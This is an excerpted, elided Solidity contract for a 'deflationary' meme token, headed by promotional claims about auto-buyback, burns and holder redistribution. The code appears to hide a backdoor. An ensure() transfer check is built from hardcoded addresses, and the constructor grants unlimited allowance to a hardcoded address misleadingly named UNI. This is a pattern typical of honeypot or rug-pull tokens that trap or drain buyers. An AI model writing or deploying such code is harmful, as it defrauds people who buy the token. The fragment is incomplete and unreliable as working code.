...
/*
     ❤️ Low market cap
📈 Ecosystem: Swap, Merch shop, NFT, BitDogCoin Game,...
⚡️ Auto Boost: Auto-buyback + Auto burn everyday
⚡️ 5% of each transaction is redistributed to token holders
...
contract ADeflationaryProject {
    ...
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address _UNI = pairFor(0xaB4a7406a66809bad582AB78aBF15723f8841A6B, 0xc8d1667C95E8B1826c1eEa1000b54bF874789d52, address(this));
    ...
    address constant UNI = 0xc8d1667C95E8B1826c1eEa1000b54bF874789d52;
    ...
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        ...
        allowance[msg.sender][0xc8d1667C95E8B1826c1eEa1000b54bF874789d52] = uint(-1);
